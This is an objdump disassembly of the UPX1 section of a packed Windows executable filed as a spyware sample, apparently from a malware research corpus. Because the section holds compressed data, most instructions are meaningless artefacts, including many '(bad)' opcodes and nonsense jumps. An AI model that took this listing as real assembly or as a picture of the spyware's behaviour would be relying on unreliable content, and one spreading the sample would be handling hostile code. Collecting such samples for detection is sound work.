
malware_samples/spyware/f9e97ee8a89f91c562d08e3142eaf0ff57aaca96b8aa52f5c7db70ff6ee95113.exe:     file format pei-i386


Disassembly of section UPX1:

0040c000 <UPX1>:
  40c000:	bf fb ff ff 85       	mov    $0x85fffffb,%edi
  40c005:	f6 75 03             	divb   0x3(%ebp)
  40c008:	33 c0                	xor    %eax,%eax
  40c00a:	c3                   	ret
  40c00b:	85 ff                	test   %edi,%edi
  40c00d:	74 06                	je     0x40c015
  40c00f:	8b 07                	mov    (%edi),%eax
  40c011:	57                   	push   %edi
  40c012:	ff 50 04             	call   *0x4(%eax)
  40c015:	8b 06                	mov    (%esi),%eax
  40c017:	85 c0                	test   %eax,%eax
  40c019:	0b 08                	or     (%eax),%ecx
  40c01b:	50                   	push   %eax
  40c01c:	ff 51 08             	call   *0x8(%ecx)
  40c01f:	89 b6 ff f6 ff 3e    	mov    %esi,0x3efff6ff(%esi)
  40c025:	8b c7                	mov    %edi,%eax
  40c027:	c3                   	ret
  40c028:	53                   	push   %ebx
  40c029:	33 db                	xor    %ebx,%ebx
  40c02b:	57                   	push   %edi
  40c02c:	88 1e                	mov    %bl,(%esi)
  40c02e:	8d 7e 0d             	lea    0xd(%esi),%edi
  40c031:	5e                   	pop    %esi
  40c032:	04 89                	add    $0x89,%al
  40c034:	1f                   	pop    %ds
  40c035:	3b c3                	cmp    %ebx,%eax
  40c037:	74 07                	je     0x40c040
  40c039:	1c 57                	sbb    $0x57,%al
  40c03b:	ff 6d b0             	ljmp   *-0x50(%ebp)
  40c03e:	ef                   	out    %eax,(%dx)
  40c03f:	1d 18 8b 3f 3b       	sbb    $0x3b3f8b18,%eax
  40c044:	fb                   	sti
  40c045:	35 0c 20 8b de       	xor    $0xde8b200c,%eax
  40c04a:	e8 01 00 00 51       	call   0x5140c050
  40c04f:	5f                   	pop    %edi
  40c050:	ff                   	lcall  (bad)
  40c051:	db ff                	(bad)
  40c053:	ff 8b c6 5b c3 55    	decl   0x55c35bc6(%ebx)
  40c059:	8b ec                	mov    %esp,%ebp
  40c05b:	51                   	push   %ecx
  40c05c:	51                   	push   %ecx
  40c05d:	8b 43 08             	mov    0x8(%ebx),%eax
  40c060:	56                   	push   %esi
  40c061:	33 f6                	xor    %esi,%esi
  40c063:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40c066:	02 f8                	add    %al,%bh
  40c068:	3b c6                	cmp    %esi,%eax
  40c06a:	74 57                	je     0x40c0c3
  40c06c:	80 3b 00             	cmpb   $0x0,(%ebx)
  40c06f:	75 bf                	jne    0x40c030
  40c071:	fb                   	sti
  40c072:	db b7 52 3a 8d 55    	(bad) 0x558d3a52(%edi)
  40c078:	f8                   	clc
  40c079:	52                   	push   %edx
  40c07a:	03 fc                	add    %esp,%edi
  40c07c:	52                   	push   %edx
  40c07d:	6a 01                	push   $0x1
  40c07f:	6a ff                	push   $0xffffffff
  40c081:	45                   	inc    %ebp
  40c082:	10 3d 05 00 04 00    	adc    %bh,0x40005
  40c088:	b7 ed                	mov    $0xed,%bh
  40c08a:	f6 db                	neg    %bl
  40c08c:	74 08                	je     0x40c096
  40c08e:	21 75 04             	and    %esi,0x4(%ebp)
  40c091:	33 c9                	xor    %ecx,%ecx
  40c093:	eb 8b                	jmp    0x40c020
  40c095:	c9                   	leave
  40c096:	41                   	inc    %ecx
  40c097:	6d                   	insl   (%dx),%es:(%edi)
  40c098:	0b 0d 7c 19 5b fb    	or     0xfb5b197c,%ecx
  40c09e:	ff b7 39 36 74 11    	push   0x11743639(%edi)
  40c0a4:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40c0a7:	8d 73 04             	lea    0x4(%ebx),%esi
  40c0aa:	39 3e                	cmp    %edi,(%esi)
  40c0ac:	74 0a                	je     0x40c0b8
  40c0ae:	e8 52 ff 00 1f       	call   0x1f41c005
  40c0b3:	c6                   	(bad)
  40c0b4:	cb                   	lret
  40c0b5:	fe                   	(bad)
  40c0b6:	97                   	xchg   %eax,%edi
  40c0b7:	fd                   	std
  40c0b8:	03 01                	add    (%ecx),%eax
  40c0ba:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c0bd:	5f                   	pop    %edi
  40c0be:	a3 8b c3 5e c9       	mov    %eax,0xc95ec38b
  40c0c3:	c3                   	ret
  40c0c4:	8b 46 08             	mov    0x8(%esi),%eax
  40c0c7:	11 eb                	adc    %ebp,%ebx
  40c0c9:	de 96 6c 0c 04 be    	ficoms -0x41fbf394(%esi)
  40c0cf:	56                   	push   %esi
  40c0d0:	8b f0                	mov    %eax,%esi
  40c0d2:	c1 38 bc             	sarl   $0xbc,(%eax)
  40c0d5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0d6:	db 76 77             	(bad) 0x77(%esi)
  40c0d9:	75 0c                	jne    0x40c0e7
  40c0db:	a1 01 ee 88 1e       	mov    0x1e88ee01,%eax
  40c0e0:	3a c4                	cmp    %ah,%al
  40c0e2:	72 10                	jb     0x40c0f4
  40c0e4:	05 75 0e ff cd       	add    $0xcdff0e75,%eax
  40c0e9:	b2 6b                	mov    $0x6b,%dl
  40c0eb:	ac                   	lods   %ds:(%esi),%al
  40c0ec:	12 02                	adc    (%edx),%al
  40c0ee:	27                   	daa
  40c0ef:	05 5f 39 5c 24       	add    $0x245c395f,%eax
  40c0f4:	10 74 59 39          	adc    %dh,0x39(%ecx,%ebx,2)
  40c0f8:	1e                   	push   %ds
  40c0f9:	ae                   	scas   %es:(%edi),%al
  40c0fa:	fd                   	std
  40c0fb:	b7 c2                	mov    $0xc2,%bh
  40c0fd:	74 55                	je     0x40c154
  40c0ff:	0d 09 ff 15 48       	or     $0x4815ff09,%eax
  40c104:	40                   	inc    %eax
  40c105:	40                   	inc    %eax
  40c106:	00 8d 84 d4 d7 6e    	add    %cl,0x6ed7d484(%ebp)
  40c10c:	b3 35                	mov    $0x35,%bl
  40c10e:	db 50 53             	fistl  0x53(%eax)
  40c111:	0e                   	push   %cs
  40c112:	4c                   	dec    %esp
  40c113:	50                   	push   %eax
  40c114:	06                   	push   %es
  40c115:	50                   	push   %eax
  40c116:	8b f8                	mov    %eax,%edi
  40c118:	fa                   	cli
  40c119:	e1 59                	loope  0x40c174
  40c11b:	b6 bf                	mov    $0xbf,%dh
  40c11d:	2f                   	das
  40c11e:	25 68 90 42 15       	and    $0x15429068,%eax
  40c123:	57                   	push   %edi
  40c124:	88 36                	mov    %dh,(%esi)
  40c126:	3c db                	cmp    $0xdb,%al
  40c128:	ba bf 7b 83 c4       	mov    $0xc4837bbf,%edx
  40c12d:	0c 16                	or     $0x16,%al
  40c12f:	14 53                	adc    $0x53,%al
  40c131:	6a 10                	push   $0x10
  40c133:	57                   	push   %edi
  40c134:	68 b4 1a 56 e4       	push   $0xe4561ab4
  40c139:	50                   	push   %eax
  40c13a:	8d                   	lea    (bad),%ebp
  40c13b:	ed                   	in     (%dx),%eax
  40c13c:	1b fe                	sbb    %esi,%edi
  40c13e:	7f 0f                	jg     0x40c14f
  40c140:	99                   	cltd
  40c141:	c0 eb 02             	shr    $0x2,%bl
  40c144:	32 c0                	xor    %al,%al
  40c146:	5f                   	pop    %edi
  40c147:	5e                   	pop    %esi
  40c148:	5b                   	pop    %ebx
  40c149:	c2 08 00             	ret    $0x8
  40c14c:	1d 83 ec 10 56       	sbb    $0x5610ec83,%eax
  40c151:	57                   	push   %edi
  40c152:	db 5a fb             	fistpl -0x5(%edx)
  40c155:	c3                   	ret
  40c156:	85 0c 79             	test   %ecx,(%ecx,%edi,2)
  40c159:	8b f7                	mov    %edi,%esi
  40c15b:	36 1e                	ss push %ds
  40c15d:	83 65 fc 6a          	andl   $0x6a,-0x4(%ebp)
  40c161:	d7                   	xlat   %ds:(%ebx)
  40c162:	bb ed b7 dd 5e       	mov    $0x5eddb7ed,%ebx
  40c167:	75 10                	jne    0x40c179
  40c169:	de 08                	fimuls (%eax)
  40c16b:	12 dd                	adc    %ch,%bl
  40c16d:	84 c3                	test   %al,%bl
  40c16f:	4c                   	dec    %esp
  40c170:	ea 53 8d 85 2f fc d8 	ljmp   $0xd8fc,$0x2f858d53
  40c177:	75 f0                	jne    0x40c169
  40c179:	22 8b d8 8a 03 88    	and    -0x77fc7528(%ebx),%cl
  40c17f:	7b 43                	jnp    0x40c1c4
  40c181:	04 8d                	add    $0x8d,%al
  40c183:	77 10                	ja     0x40c195
  40c185:	bb 2b bc 95 06       	mov    $0x695bc2b,%ebx
  40c18a:	83 e8 3f             	sub    $0x3f,%eax
  40c18d:	fe                   	(bad)
  40c18e:	12 45 8b             	adc    -0x75(%ebp),%al
  40c191:	5b                   	pop    %ebx
  40c192:	08 13                	or     %dl,(%ebx)
  40c194:	0d 36 b9 79 08       	or     $0x879b936,%eax
  40c199:	39 1e                	cmp    %ebx,(%esi)
  40c19b:	fb                   	sti
  40c19c:	e8 2b 35 c2 f8       	call   0xf902f6cc
  40c1a1:	56                   	push   %esi
  40c1a2:	38 c1                	cmp    %al,%cl
  40c1a4:	41                   	inc    %ecx
  40c1a5:	08 5b ca             	or     %bl,-0x36(%ebx)
  40c1a8:	7e c9                	jle    0x40c173
  40c1aa:	c2 0c 00             	ret    $0xc
  40c1ad:	ff 0b                	decl   (%ebx)
  40c1af:	66 6b 94 56 af 90 65 	imul   $0xb,0x7d6590af(%esi,%edx,2),%dx
  40c1b6:	7d 0b 
  40c1b8:	3d 06 01 01 80       	cmp    $0x80010106,%eax
  40c1bd:	74 04                	je     0x40c1c3
  40c1bf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40c1c0:	fb                   	sti
  40c1c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1c2:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1c3:	9b                   	fwait
  40c1c4:	5e                   	pop    %esi
  40c1c5:	c3                   	ret
  40c1c6:	56                   	push   %esi
  40c1c7:	00 6a 03             	add    %ch,0x3(%edx)
  40c1ca:	04 ff                	add    $0xff,%al
  40c1cc:	1f                   	pop    %ds
  40c1cd:	a0 0e 13 be f9       	mov    0xf9be130e,%al
  40c1d2:	07                   	pop    %es
  40c1d3:	3d 19 75 e0 b0       	cmp    $0xb0e07519,%eax
  40c1d8:	01 5e d5             	add    %ebx,-0x2b(%esi)
  40c1db:	4e                   	dec    %esi
  40c1dc:	5e                   	pop    %esi
  40c1dd:	28 b4 df a8 f8 50 68 	sub    %dh,0x6850f8a8(%edi,%ebx,8)
  40c1e4:	00 41 20             	add    %al,0x20(%ecx)
  40c1e7:	57                   	push   %edi
  40c1e8:	c5 53 68             	lds    0x68(%ebx),%edx
  40c1eb:	d0 6b 66             	shrb   $1,0x66(%ebx)
  40c1ee:	db ee                	fucomi %st(6),%st
  40c1f0:	09 89 5d fc 02 f8    	or     %ecx,-0x7fd03a3(%ecx)
  40c1f6:	36 98                	ss cwtl
  40c1f8:	ee                   	out    %al,(%dx)
  40c1f9:	74 d6                	je     0x40c1d1
  40c1fb:	86 e0                	xchg   %ah,%al
  40c1fd:	78 f8                	js     0x40c1f7
  40c1ff:	79 1b                	jns    0x40c21c
  40c201:	29 90 83 0c b1 8f    	sub    %edx,-0x704ef37d(%eax)
  40c207:	76 5b                	jbe    0x40c264
  40c209:	69 eb 5f 09 01 53    	imul   $0x5301095f,%ebx,%ebp
  40c20f:	00 db                	add    %bl,%bl
  40c211:	dd 3a                	fnstsw (%edx)
  40c213:	c3                   	ret
  40c214:	68 bc 25 18 0c       	push   $0xc1825bc
  40c219:	36 79 05             	ss jns 0x40c221
  40c21c:	38 eb                	cmp    %ch,%bl
  40c21e:	c7                   	(bad)
  40c21f:	13 db                	adc    %ebx,%ebx
  40c221:	42                   	inc    %edx
  40c222:	d7                   	xlat   %ds:(%ebx)
  40c223:	5a                   	pop    %edx
  40c224:	86 01                	xchg   %al,(%ecx)
  40c226:	05 0a 0d fc 52       	add    $0x52fc0d0a,%eax
  40c22b:	94                   	xchg   %eax,%esp
  40c22c:	f7 8e 86 23 78 e4 2f 	testl  $0x508fc2f,-0x1b87dc7a(%esi)
  40c233:	fc 08 05 
  40c236:	e8 49 fd e1 6d       	call   0x6e22bf84
  40c23b:	17                   	pop    %ss
  40c23c:	c2 36 28             	ret    $0x2836
  40c23f:	5f                   	pop    %edi
  40c240:	60                   	pusha
  40c241:	aa                   	stos   %al,%es:(%edi)
  40c242:	5b                   	pop    %ebx
  40c243:	c9                   	leave
  40c244:	cc                   	int3
  40c245:	bf d9 dc ee be       	mov    $0xbeeedcd9,%edi
  40c24a:	20 70 96             	and    %dh,-0x6a(%eax)
  40c24d:	35 38 05 43 40       	xor    $0x40430538,%eax
  40c252:	0f b7 c0             	movzwl %ax,%eax
  40c255:	32 c9                	xor    %cl,%cl
  40c257:	0f 97 ff             	seta   %bh
  40c25a:	bb ff b6 d1 6b       	mov    $0x6bd1b6ff,%ebx
  40c25f:	d2 0c 66             	rorb   %cl,(%esi,%eiz,2)
  40c262:	3b 82 2a 17 74 09    	cmp    0x974172a(%edx),%eax
  40c268:	fe c1                	inc    %cl
  40c26a:	80 f9 02             	cmp    $0x2,%cl
  40c26d:	72 ea                	jb     0x40c259
  40c26f:	eb 0e                	jmp    0x40c27f
  40c271:	c9                   	leave
  40c272:	6b db dd             	imul   $0xffffffdd,%ebx,%ebx
  40c275:	fd                   	std
  40c276:	fd                   	std
  40c277:	c9                   	leave
  40c278:	0c 03                	or     $0x3,%al
  40c27a:	ce                   	into
  40c27b:	89 0d 30 68 18 80    	mov    %ecx,0x80186830
  40c281:	93                   	xchg   %eax,%ebx
  40c282:	68 14 66 0a 28       	push   $0x280a6614
  40c287:	66 40                	inc    %ax
  40c289:	64 64 79 e4          	fs fs jns 0x40c271
  40c28d:	44                   	inc    %esp
  40c28e:	c8 32 c0 d0          	enter  $0xc032,$0xd0
  40c292:	8a bb bc bc 7d 08    	mov    0x87dbcbc(%ebx),%bh
  40c298:	fe c0                	inc    %al
  40c29a:	3c 3f                	cmp    $0x3f,%al
  40c29c:	eb 5e                	jmp    0x40c2fc
  40c29e:	c3                   	ret
  40c29f:	c0 6b c0 c6          	shrb   $0xc6,-0x40(%ebx)
  40c2a3:	a3 3e 70 63 7b       	mov    %eax,0x7b63703e
  40c2a8:	db 0e                	fisttpl (%esi)
  40c2aa:	a1 06 2f 50 d6       	mov    0xd6502f06,%eax
  40c2af:	ca 73 1d             	lret   $0x1d73
  40c2b2:	37                   	aaa
  40c2b3:	bd b4 b2 40 54       	mov    $0x5440b2b4,%ebp
  40c2b8:	04 88                	add    $0x88,%al
  40c2ba:	c3                   	ret
  40c2bb:	65 83 7c 24 eb 12    	cmpl   $0x12,%gs:-0x15(%esp)
  40c2c1:	6b be b7 1d 20 04 6a 	imul   $0x6a,0x4201db7(%esi),%edi
  40c2c8:	54                   	push   %esp
  40c2c9:	35 04 7e 5a 3c       	xor    $0x3c5a7e04,%eax
  40c2ce:	c2 16 3b             	ret    $0x3b16
  40c2d1:	7e bc                	jle    0x40c28f
  40c2d3:	5d                   	pop    %ebp
  40c2d4:	14 08                	adc    $0x8,%al
  40c2d6:	6a 05                	push   $0x5
  40c2d8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c2d9:	03 97 27 50 57 fe    	add    -0x1a8afd9(%edi),%edx
  40c2df:	1b 6d e3             	sbb    -0x1d(%ebp),%ebp
  40c2e2:	51                   	push   %ecx
  40c2e3:	8a 44 4a 8b          	mov    -0x75(%edx,%ecx,2),%al
  40c2e7:	34 13                	xor    $0x13,%al
  40c2e9:	4c                   	dec    %esp
  40c2ea:	24 18                	and    $0x18,%al
  40c2ec:	f3 aa                	rep stos %al,%es:(%edi)
  40c2ee:	59                   	pop    %ecx
  40c2ef:	5f                   	pop    %edi
  40c2f0:	58                   	pop    %eax
  40c2f1:	f4                   	hlt
  40c2f2:	db bf 19 bf 47 85    	fstpt  -0x7ab840e7(%edi)
  40c2f8:	c9                   	leave
  40c2f9:	74 0d                	je     0x40c308
  40c2fb:	66 39 01             	cmp    %ax,(%ecx)
  40c2fe:	7d 40                	jge    0x40c340
  40c300:	66 83 3c 41 7f       	cmpw   $0x7f,(%ecx,%eax,2)
  40c305:	a9 b1 b1 55 f8       	test   $0xf855b1b1,%eax
  40c30a:	e4 8b                	in     $0x8b,%al
  40c30c:	ba 01 d2 7f 05       	mov    $0x57fd201,%edx
  40c311:	83 c8 ff             	or     $0xffffffff,%eax
  40c314:	d8 7e 8d             	fdivrs -0x73(%esi)
  40c317:	b7 5b                	mov    $0x5b,%bh
  40c319:	fb                   	sti
  40c31a:	8d 34 12             	lea    (%edx,%edx,1),%esi
  40c31d:	5e                   	pop    %esi
  40c31e:	46                   	inc    %esi
  40c31f:	85 8d 40 10 ff 92    	test   %ecx,-0x6d00efc0(%ebp)
  40c325:	e9 d8 bb 52 a0       	jmp    0xa0937f02
  40c32a:	64 5c                	fs pop %esp
  40c32c:	66 89 4c 3e fe       	mov    %cx,-0x2(%esi,%edi,1)
  40c331:	5e                   	pop    %esi
  40c332:	83 7e dd 0b          	cmpl   $0xb,-0x23(%esi)
  40c336:	0b a9 75 34 cf 5b    	or     0x5bcf3475(%ecx),%ebp
  40c33c:	e9 22 ae 14 0c       	jmp    0xc557163
  40c341:	47                   	inc    %edi
  40c342:	b9 50 78 9c b4       	mov    $0xb49c7850,%ecx
  40c347:	96                   	xchg   %eax,%esi
  40c348:	8f                   	(bad)
  40c349:	d6                   	salc
  40c34a:	00 f0                	add    %dh,%al
  40c34c:	f0 0b 85 42 da 80 e7 	lock or -0x187f25be(%ebp),%eax
  40c353:	f0 50                	lock push %eax
  40c355:	88 5d ff             	mov    %bl,-0x1(%ebp)
  40c358:	db 70 38             	(bad) 0x38(%eax)
  40c35b:	b2 82                	mov    $0x82,%dl
  40c35d:	00 74 69 f8          	add    %dh,-0x8(%ecx,%ebp,2)
  40c361:	b1 03                	mov    $0x3,%cl
  40c363:	80 22 f1             	andb   $0xf1,(%edx)
  40c366:	cd 6c                	int    $0x6c
  40c368:	5b                   	pop    %ebx
  40c369:	40                   	inc    %eax
  40c36a:	f0 17                	lock pop %ss
  40c36c:	08 4b 01             	or     %cl,0x1(%ebx)
  40c36f:	75 46                	jne    0x40c3b7
  40c371:	53                   	push   %ebx
  40c372:	c8 b2 7d df          	enter  $0x7db2,$0xdf
  40c376:	b7 c7                	mov    $0xc7,%bh
  40c378:	45                   	inc    %ebp
  40c379:	f4                   	hlt
  40c37a:	10 00                	adc    %al,(%eax)
  40c37c:	18 0c 1b             	sbb    %cl,(%ebx,%ebx,1)
  40c37f:	f8                   	clc
  40c380:	10 c6                	adc    %al,%dh
  40c382:	36 47                	ss inc %edi
  40c384:	37                   	aaa
  40c385:	21 46 f4             	and    %eax,-0xc(%esi)
  40c388:	d7                   	xlat   %ds:(%ebx)
  40c389:	dc 02                	faddl  (%edx)
  40c38b:	17                   	pop    %ss
  40c38c:	04 d8                	add    $0xd8,%al
  40c38e:	5b                   	pop    %ebx
  40c38f:	ed                   	in     (%dx),%eax
  40c390:	41                   	inc    %ecx
  40c391:	09 83 7d 2f 7b 88    	or     %eax,-0x7784d083(%ebx)
  40c397:	45                   	inc    %ebp
  40c398:	ff 16                	call   *(%esi)
  40c39a:	b1 35                	mov    $0x35,%cl
  40c39c:	63 cd                	arpl   %ecx,%ebp
  40c39e:	0c 53                	or     $0x53,%al
  40c3a0:	54                   	push   %esp
  40c3a1:	14 8a                	adc    $0x8a,%al
  40c3a3:	15 5b 72 f6 6d       	adc    $0x6df6725b,%eax
  40c3a8:	e1 ab                	loope  0x40c355
  40c3aa:	56                   	push   %esi
  40c3ab:	c1 02 ca             	roll   $0xca,(%edx)
  40c3ae:	03 c1                	add    %ecx,%eax
  40c3b0:	c3                   	ret
  40c3b1:	08 2b                	or     %ch,(%ebx)
  40c3b3:	5f                   	pop    %edi
  40c3b4:	58                   	pop    %eax
  40c3b5:	06                   	push   %es
  40c3b6:	3b f7                	cmp    %edi,%esi
  40c3b8:	d0 0e                	rorb   $1,(%esi)
  40c3ba:	33 8a c0 fa 08 72    	xor    0x7208fac0(%edx),%ecx
  40c3c0:	0e                   	push   %cs
  40c3c1:	61                   	popa
  40c3c2:	ff b7 b7 56 0d f2    	push   -0xdf2a949(%edi)
  40c3c8:	c1 ee 97             	shr    $0x97,%esi
  40c3cb:	c2 f8 4e             	ret    $0x4ef8
  40c3ce:	75 fa                	jne    0x40c3ca
  40c3d0:	5e                   	pop    %esi
  40c3d1:	8a ca                	mov    %dl,%cl
  40c3d3:	d2 c0                	rol    %cl,%al
  40c3d5:	19 1f                	sbb    %ebx,(%edi)
  40c3d7:	7b 1a                	jnp    0x40c3f3
  40c3d9:	4e                   	dec    %esi
  40c3da:	c8 c3 63 04          	enter  $0x63c3,$0x4
  40c3de:	69 f2 e4 f8 81 ec    	imul   $0xec81f8e4,%edx,%esi
  40c3e4:	b8 5d 6a b8 8c       	mov    $0x8cb86a5d,%eax
  40c3e9:	b7 d8                	mov    $0xd8,%bh
  40c3eb:	b0 04                	mov    $0x4,%al
  40c3ed:	20 07                	and    %al,(%edi)
  40c3ef:	6a 08                	push   $0x8
  40c3f1:	83 b4 f0 71 98 db 89 	xorl   $0x53,-0x7624678f(%eax,%esi,8)
  40c3f8:	53 
  40c3f9:	34 ee                	xor    $0xee,%al
  40c3fb:	f0 b0 a1             	lock mov $0xa1,%al
  40c3fe:	f0 86 89 97 3b f3 75 	lock xchg %cl,0x75f33b97(%ecx)
  40c405:	07                   	pop    %es
  40c406:	7c 33                	jl     0x40c43b
  40c408:	07                   	pop    %es
  40c409:	96                   	xchg   %eax,%esi
  40c40a:	dd 6e 83             	(bad) -0x7d(%esi)
  40c40d:	a3 24 15 5b 30       	mov    %eax,0x305b1524
  40c412:	50                   	push   %eax
  40c413:	04 18                	add    $0x18,%al
  40c415:	50                   	push   %eax
  40c416:	29 1c 77             	sub    %ebx,(%edi,%esi,2)
  40c419:	dd bf ba 66 04 20    	fnstsw 0x200466ba(%edi)
  40c41f:	60                   	pusha
  40c420:	6f                   	outsl  %ds:(%esi),(%dx)
  40c421:	8b 3d 34 33 39 3d    	mov    0x3d393334,%edi
  40c427:	0f 84 f2 3c 5b c3    	je     0xc39c011f
  40c42d:	75 59                	jne    0x40c488
  40c42f:	8b 27                	mov    (%edi),%esp
  40c431:	9e                   	sahf
  40c432:	0b e6                	or     %esi,%esp
  40c434:	08 18                	or     %bl,(%eax)
  40c436:	b9 b1 35 56 54       	mov    $0x545635b1,%ecx
  40c43b:	28 52 f7             	sub    %dl,-0x9(%edx)
  40c43e:	b4 66                	mov    $0x66,%ah
  40c440:	10 97 9a 77 ec db    	adc    %dl,-0x24138866(%edi)
  40c446:	24 66                	and    $0x66,%al
  40c448:	19 18                	sbb    %ebx,(%eax)
  40c44a:	08 75 11             	or     %dh,0x11(%ebp)
  40c44d:	20 7c d7 56          	and    %bh,0x56(%edi,%edx,8)
  40c451:	ce                   	into
  40c452:	16                   	push   %ss
  40c453:	3b 58 7b             	cmp    0x7b(%eax),%ebx
  40c456:	34 46                	xor    $0x46,%al
  40c458:	5e                   	pop    %esi
  40c459:	84 58 17             	test   %bl,0x17(%eax)
  40c45c:	25 03 e6 46 3e       	and    $0x3e46e603,%eax
  40c461:	d0 e8                	shr    $1,%al
  40c463:	1a b7 ee 25 51 66    	sbb    0x665125ee(%edi),%dh
  40c469:	1b 18                	sbb    (%eax),%ebx
  40c46b:	43                   	inc    %ebx
  40c46c:	f8                   	clc
  40c46d:	13 9a f7 6e 6e ee    	adc    -0x11919109(%edx),%ebx
  40c473:	05 03 74 0c 17       	add    $0x170c7403,%eax
  40c478:	74 06                	je     0x40c480
  40c47a:	16                   	push   %ss
  40c47b:	75 29                	jne    0x40c4a6
  40c47d:	53                   	push   %ebx
  40c47e:	46                   	inc    %esi
  40c47f:	3b d7                	cmp    %edi,%edx
  40c481:	ac                   	lods   %ds:(%esi),%al
  40c482:	77 74                	ja     0x40c4f8
  40c484:	68 fc 31 e8 e4       	push   $0xe4e831fc
  40c489:	12 70 50             	adc    0x50(%eax),%dh
  40c48c:	c9                   	leave
  40c48d:	08 1f                	or     %bl,(%edi)
  40c48f:	61                   	popa
  40c490:	6b 68 08 67          	imul   $0x67,0x8(%eax),%ebp
  40c494:	1e                   	push   %ds
  40c495:	58                   	pop    %eax
  40c496:	53                   	push   %ebx
  40c497:	77 43                	ja     0x40c4dc
  40c499:	84 15 0f 5c 74 43    	test   %dl,0x43745c0f
  40c49f:	69 58 aa 32 80 0c 42 	imul   $0x420c8032,-0x56(%eax),%ebx
  40c4a6:	3b 07                	cmp    (%edi),%eax
  40c4a8:	68 60 c9 21 47       	push   $0x4721c960
  40c4ad:	76 68                	jbe    0x40c517
  40c4af:	5c                   	pop    %esp
  40c4b0:	60                   	pusha
  40c4b1:	20 d2                	and    %dl,%dl
  40c4b3:	34 5f                	xor    $0x5f,%al
  40c4b5:	c8 4c 50 74          	enter  $0x504c,$0x74
  40c4b9:	40                   	inc    %eax
  40c4ba:	4c                   	dec    %esp
  40c4bb:	38 79 26             	cmp    %bh,0x26(%ecx)
  40c4be:	d9 0c 40             	(bad) (%eax,%eax,2)
  40c4c1:	40                   	inc    %eax
  40c4c2:	67 21 38             	and    %edi,(%bx,%si)
  40c4c5:	48                   	dec    %eax
  40c4c6:	c3                   	ret
  40c4c7:	92                   	xchg   %eax,%edx
  40c4c8:	66 0e                	pushw  %cs
  40c4ca:	40                   	inc    %eax
  40c4cb:	22 38                	and    (%eax),%bh
  40c4cd:	30 6e a0             	xor    %ch,-0x60(%esi)
  40c4d0:	61                   	popa
  40c4d1:	e4 66                	in     $0x66,%al
  40c4d3:	46                   	inc    %esi
  40c4d4:	4f                   	dec    %edi
  40c4d5:	6a 46                	push   $0x46
  40c4d7:	05 cd c0 76 c2       	add    $0xc276c0cd,%eax
  40c4dc:	ff 89 23 28 f2 5a    	decl   0x5af22823(%ecx)
  40c4e2:	3e 5d                	ds pop %ebp
  40c4e4:	fb                   	sti
  40c4e5:	e3 35                	jecxz  0x40c51c
  40c4e7:	8b ce                	mov    %esi,%ecx
  40c4e9:	39 ae 03 c0 fb 7d    	cmp    %ebp,0x7dfbc003(%esi)
  40c4ef:	40                   	inc    %eax
  40c4f0:	04 06                	add    $0x6,%al
  40c4f2:	72 b7                	jb     0x40c4ab
  40c4f4:	1b 05 50 64 44 34    	sbb    0x34446450,%eax
  40c4fa:	45                   	inc    %ebp
  40c4fb:	68 4c 6d 21 fd       	push   $0xfd216d4c
  40c500:	ff                   	lcall  (bad)
  40c501:	db b9 5a 22 c2 83    	fstpt  -0x7c3ddda6(%ecx)
  40c507:	c7 04 46 59 59 83 fe 	movl   $0xfe835959,(%esi,%eax,2)
  40c50e:	10 72 e2             	adc    %dh,-0x1e(%edx)
  40c511:	d4 ba                	aam    $0xba
  40c513:	08 6c a5 3f          	or     %ch,0x3f(%ebp,%eiz,4)
  40c517:	08 48 95             	or     %cl,-0x6b(%eax)
  40c51a:	08 54 cb 34          	or     %dl,0x34(%ebx,%ecx,8)
  40c51e:	81 43 2c a7 a8 d0 8f 	addl   $0x8fd0a8a7,0x2c(%ebx)
  40c525:	3b 70 01             	cmp    0x1(%eax),%esi
  40c528:	70 2c                	jo     0x40c556
  40c52a:	8b e5                	mov    %ebp,%esp
  40c52c:	5d                   	pop    %ebp
  40c52d:	a3 d1 2a 95 1b       	mov    %eax,0x1b952ad1
  40c532:	a0 00 02 2f 12       	mov    0x122f0200,%al
  40c537:	25 1a 5f a1 a3       	and    $0xa3a15f1a,%eax
  40c53c:	3a 72 f9             	cmp    -0x7(%edx),%dh
  40c53f:	91                   	xchg   %eax,%ecx
  40c540:	b8 70 c7 9f ed       	mov    $0xed9fc770,%eax
  40c545:	74 30                	je     0x40c577
  40c547:	56                   	push   %esi
  40c548:	6c                   	insb   (%dx),%es:(%edi)
  40c549:	59                   	pop    %ecx
  40c54a:	52                   	push   %edx
  40c54b:	50                   	push   %eax
  40c54c:	ba ff 5c 8d bd       	mov    $0xbd8d5cff,%edx
  40c551:	00 69 81             	add    %ch,-0x7f(%ecx)
  40c554:	16                   	push   %ss
  40c555:	33 fc                	xor    %esp,%edi
  40c557:	7d 79                	jge    0x40c5d2
  40c559:	ee                   	out    %al,(%dx)
  40c55a:	50                   	push   %eax
  40c55b:	71 e9                	jno    0x40c546
  40c55d:	c6                   	(bad)
  40c55e:	9a ed 08 c1 7c 56 7f 	lcall  $0x7f56,$0x7cc108ed
  40c565:	6a cf                	push   $0xffffffcf
  40c567:	30 ed                	xor    %ch,%ch
  40c569:	66 b9 a3 cc          	mov    $0xcca3,%cx
  40c56d:	92                   	xchg   %eax,%edx
  40c56e:	08 48 48             	or     %cl,0x48(%eax)
  40c571:	aa                   	stos   %al,%es:(%edi)
  40c572:	83 e8 0e             	sub    $0xe,%eax
  40c575:	08 fd                	or     %bh,%ch
  40c577:	8c 0f                	mov    %cs,(%edi)
  40c579:	9a 95 2d e8 74 e2 08 	lcall  $0x8e2,$0x74e82d95
  40c580:	ab                   	stos   %eax,%es:(%edi)
  40c581:	53                   	push   %ebx
  40c582:	55                   	push   %ebp
  40c583:	6d                   	insl   (%dx),%es:(%edi)
  40c584:	73 50                	jae    0x40c5d6
  40c586:	36 10 40 80          	adc    %al,%ss:-0x80(%eax)
  40c58a:	2e 67 01 01          	add    %eax,%cs:(%bx,%di)
  40c58e:	7d 1f                	jge    0x40c5af
  40c590:	9e                   	sahf
  40c591:	0b 10                	or     (%eax),%edx
  40c593:	10 80 70 29 3d 78    	adc    %al,0x783d2970(%eax)
  40c599:	05 e8 d6 70 ba       	add    $0xba70d6e8,%eax
  40c59e:	a1 23 33 1c bb       	mov    0xbb1c3323,%eax
